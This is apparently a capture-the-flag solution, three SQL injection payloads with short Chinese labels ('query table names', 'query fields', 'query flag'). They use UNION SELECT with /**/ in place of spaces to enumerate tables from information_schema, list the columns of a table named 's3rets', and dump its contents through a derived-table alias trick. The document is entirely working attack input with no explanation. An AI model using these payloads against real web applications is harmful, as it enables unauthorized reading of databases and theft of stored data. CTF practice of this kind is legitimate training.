查表名
```
-1'union/**/select/**/(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),'2
```

查字段
```
-1'union/**/select/**/(select(group_concat(column_name))from(information_schema.columns)where(table_name='s3rets')),'2
```

查flag
```
-1'union/**/select/**/(select/**/group_concat(b)/**/from(select/**/1/**/a,2/**/b/**/union/**/select/**/*/**/from/**/s3rets)x),'2
```